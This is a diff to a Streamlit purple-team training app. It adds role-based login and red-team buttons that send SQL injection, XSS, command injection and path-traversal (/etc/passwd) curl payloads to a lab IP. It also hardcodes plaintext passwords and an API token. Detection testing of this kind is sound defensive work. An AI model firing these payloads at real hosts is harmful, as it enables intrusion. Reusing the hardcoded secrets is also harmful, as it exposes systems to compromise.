@@ -1,127 +1,193 @@
 import streamlit as st
 import pandas as pd
 import purple
-from red import red_team
+from red import run_payload
 from mediator import AIModel
 from log_manager import log_attack, ATTACK_LOG_FILE, DETECTION_LOG_FILE
 import time
 
 ai = AIModel(api_key="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", model_name="mistralai/Mixtral-8x7B-Instruct-v0.1")
 
-# Right after imports
-st.markdown("""
-    <style>
-        .block-container {
-            max-width: 95vw !important;
-            padding-left: 20rem !important;
-            padding-right: 20rem !important;
-        }
-    </style>
-    """, unsafe_allow_html=True)
+USER_CREDENTIALS = {
+    "admin": {"password": "adminpass", "role": "admin"},
+    "red": {"password": "redpass", "role": "red"},
+    "blue": {"password": "bluepass", "role": "blue"}
+}
 
-# Title and Layout
-st.title("Purple Team Security Tool")
+if 'logged_in' not in st.session_state:
+    st.session_state['logged_in'] = False
+    st.session_state['user_role'] = None
 
-if "active_tab" not in st.session_state:
-    st.session_state.active_tab = "Red Team (Attack)"
+if not st.session_state['logged_in']:
+    st.title("Login")
 
-tab_labels = ["Red Team (Attack)", "Purple Team Analysis", "Blue Team (Defense)"]
-tabs = st.tabs(tab_labels)
-red_tab, purple_tab, blue_tab = tabs
+    username = st.text_input("Username")
+    password = st.text_input("Password", type="password")
 
-# Streamlit workaround: session state active tab
-for idx, label in enumerate(tab_labels):
-    if tabs[idx]:
-        st.session_state.active_tab = label
+    if st.button("Login"):
+        user = USER_CREDENTIALS.get(username)
+        if user and user["password"] == password:
+            st.session_state['logged_in'] = True
+            st.session_state['user_role'] = user["role"]
+            st.success("Login successful!")
+            st.rerun()
+        else:
+            st.error("Invalid credentials.")
+else:
+    role = st.session_state['user_role']
 
-with red_tab:
-    st.header("Red Team (Attack)")
+    st.markdown("""
+        <style>
+            .block-container {
+                max-width: 95vw !important;
+                padding-left: 20rem !important;
+                padding-right: 20rem !important;
+            }
+        </style>
+        """, unsafe_allow_html=True)
 
-    if st.button("Basic SQL Injection"):
-        st.text_area("Red Team Log", red_team.sqli_basic(), height=200)
+    st.title("Purple Team Security Tool")
 
-    if st.button("Basic XSS"):
-        st.text_area("Red Team Log", red_team.xss_basic(), height=200)
+    # Define tab visibility based on user role
+    tabs_dict = {
+        "admin": ["Red Team (Attack)", "Custom Attack Logging", "Purple Team Analysis", "Blue Team (Defense)"],
+        "red": ["Red Team (Attack)", "Custom Attack Logging", "Purple Team Analysis"],
+        "blue": ["Purple Team Analysis", "Blue Team (Defense)"]
+    }
 
-    if st.button("Command Injection"):
-        st.text_area("Red Team Log", red_team.command_injection(), height=200)
+    tabs_labels = tabs_dict[role]
+    tabs = st.tabs(tabs_labels)
 
-    if st.button("Basic LFI"):
-        st.text_area("Red Team Log", red_team.lfi_basic(), height=200)
+    tabs_content = {label: tab for label, tab in zip(tabs_labels, tabs)}
 
-    if st.button("False Positive - SQL Keyword"):
-        st.text_area("Red Team Log", red_team.false_positive(), height=200)
+    if "Red Team (Attack)" in tabs_content:
+        with tabs_content["Red Team (Attack)"]:
+            st.header("Red Team (Attack)")
 
-with purple_tab:
-    st.header("Purple Team Analysis")
+            with st.expander("Configure Target IP"):
+                target_ip = st.text_input("Enter Target IP", value="192.168.8.133")
 
-    results = purple.run_purple_team_analysis(ATTACK_LOG_FILE, DETECTION_LOG_FILE)
+            if st.button("Basic SQL Injection"):
+                red_team_payload = f'curl -i "http://{target_ip}/index.html?user=admin%27%20OR%201%3D1--"'
+                result = run_payload(red_team_payload, "SQLi")
+                st.text_area("Red Team Log", result, height=200)
 
-    # Helper to flatten logs
-    def flatten_entry(entry, category_label):
-        flat = {
-            "category": category_label,
-            "timestamp": entry.get("timestamp", ""),
-            "event_type": entry.get("event_type", ""),
-            "target": entry.get("target", ""),
-            "attacker_ip": entry.get("attacker_ip", ""),
-            "source_ip": entry.get("source_ip", "")
-        }
+            if st.button("Basic XSS"):
+                red_team_payload = f'curl -i "http://{target_ip}/index.html?q=<script>alert(\'XSS\')</script>"'
+                result = run_payload(red_team_payload, "XSS")
+                st.text_area("Red Team Log", result, height=200)
 
-        # Flatten details if present
-        details = entry.get("details", {})
-        for key, value in details.items():
-            flat[key] = value
+            if st.button("Command Injection"):
+                red_team_payload = f'curl -i -X POST "http://{target_ip}/login" -d "username=admin;phpinfo();" -A "curl"'
+                result = run_payload(red_team_payload, "CMDi")
+                st.text_area("Red Team Log", result, height=200)
 
-        return flat
+            if st.button("Basic LFI"):
+                red_team_payload = f'curl -i "http://{target_ip}/index.html?page=../../../../etc/passwd"'
+                result = run_payload(red_team_payload, "LFI")
+                st.text_area("Red Team Log", result, height=200)
 
-    # Prepare rows for all categories
-    rows = []
+            if st.button("False Positive - SQL Keyword"):
+                red_team_payload = f'curl -i "http://{target_ip}/index.html?contact=%22+SELECT+FROM+help"'
+                result = run_payload(red_team_payload, "False Positive")
+                st.text_area("Red Team Log", result, height=200)
 
-    for item in results["detected_attacks"]:
-        rows.append(flatten_entry(item["attack"], "Detected"))
+    if "Custom Attack Logging" in tabs_content:
+        with tabs_content["Custom Attack Logging"]:
+            st.header("Custom Attacks")
 
-    for item in results["missed_attacks"]:
-        rows.append(flatten_entry(item, "Missed"))
+            with st.form("custom_attack_form"):
+                log_type = st.text_input("Attack Type (SQLi, XSS, RCE):")
+                target_url = st.text_input("Target:", value="192.168.8.133")
+                attack_details = st.text_area("Attack Details:")
+                attacker_ip = st.text_input("Attacker IP:", value="192.168.8.157")
+                submitted = st.form_submit_button("Log Attack")
 
-    for item in results["false_positives"]:
-        rows.append(flatten_entry(item, "False Positive"))
+                if submitted:
+                    if not log_type or not target_url or not attack_details:
+                        st.error("All fields must be filled out.")
+                    else:
+                        try:
+                            log_attack(log_type, target_url, attack_details, attacker_ip)
+                            st.success(f"[LOGGED] {log_type} attack on {target_url}")
+                        except Exception as e:
+                            st.error(f"[ERROR] Failed to write log: {str(e)}")
 
-    # Convert to DataFrame
-    if rows:
-        df = pd.DataFrame(rows)
-        df = df.reset_index(drop=True)
-        st.dataframe(df, use_container_width=True)
-    else:
-        st.info("No results to display.")
+    if "Purple Team Analysis" in tabs_content:
+        with tabs_content["Purple Team Analysis"]:
 
-    # Optional: auto-refresh
-    if st.session_state.get('active_tab', '') == "Purple Team Analysis":
-        time.sleep(2)
-        st.experimental_rerun()
+            results = purple.run_purple_team_analysis(ATTACK_LOG_FILE, DETECTION_LOG_FILE)
 
-with blue_tab:
-    st.header("Blue Team (Defense)")
+            # Helper to flatten logs
+            def flatten_entry(entry, category_label):
+                flat = {
+                    "category": category_label,
+                    "timestamp": entry.get("timestamp", ""),
+                    "event_type": entry.get("event_type", ""),
+                    "target": entry.get("target", ""),
+                    "attacker_ip": entry.get("attacker_ip", ""),
+                    "source_ip": entry.get("source_ip", "")
+                }
 
-    st.write("### ❌ Missed Attacks")
-    if results["missed_attacks"]:
-        for missed_attack in results["missed_attacks"]:
-            st.json(missed_attack)
-            recommendation = ai.recommend_solution(missed_attack, issue_type="missed_attack")
-            st.write(f"**AI Recommendation:** {recommendation}")
-    else:
-        st.write("No missed attacks detected.")
+                # Flatten details if present
+                details = entry.get("details", {})
+                for key, value in details.items():
+                    flat[key] = value
 
-    st.markdown("---")
+                return flat
 
-    st.write("### ⚠️ False Positives")
-    if results["false_positives"]:
-        for false_positive in results["false_positives"]:
-            st.json(false_positive)
-            recommendation = ai.recommend_solution(false_positive, issue_type="false_positive")
-            st.write(f"**AI Recommendation:** {recommendation}")
-    else:
-        st.write("No false positives detected.")
+            # Prepare rows for all categories
+            rows = []
 
-    if not results["missed_attacks"] and not results["false_positives"]:
-        st.success("✅ No recommendations needed! Everything looks clean.")
+            for item in results["detected_attacks"]:
+                rows.append(flatten_entry(item["attack"], "Detected"))
+
+            for item in results["missed_attacks"]:
+                rows.append(flatten_entry(item, "Missed"))
+
+            for item in results["false_positives"]:
+                rows.append(flatten_entry(item, "False Positive"))
+
+            # Convert to DataFrame
+            if rows:
+                df = pd.DataFrame(rows)
+                df = df.reset_index(drop=True)
+                st.dataframe(df, use_container_width=True)
+            else:
+                st.info("No results to display.")
+
+            # Optional: auto-refresh
+            if st.session_state.get('active_tab', '') == "Purple Team Analysis":
+                time.sleep(2)
+                st.rerun()
+
+    if "Blue Team (Defense)" in tabs_content:
+        with tabs_content["Blue Team (Defense)"]:
+
+            st.write("### ❌ Missed Attacks")
+            if results["missed_attacks"]:
+                for missed_attack in results["missed_attacks"]:
+                    st.json(missed_attack)
+                    recommendation = ai.recommend_solution(missed_attack, issue_type="missed_attack")
+                    st.write(f"**AI Recommendation:** {recommendation}")
+            else:
+                st.write("No missed attacks detected.")
+
+            st.markdown("---")
+
+            st.write("### ⚠️ False Positives")
+            if results["false_positives"]:
+                for false_positive in results["false_positives"]:
+                    st.json(false_positive)
+                    recommendation = ai.recommend_solution(false_positive, issue_type="false_positive")
+                    st.write(f"**AI Recommendation:** {recommendation}")
+            else:
+                st.write("No false positives detected.")
+
+            if not results["missed_attacks"] and not results["false_positives"]:
+                st.success("✅ No recommendations needed! Everything looks clean.")
+    
+    if st.button("Logout"):
+        st.session_state['logged_in'] = False
+        st.session_state['user_role'] = None
+        st.rerun()
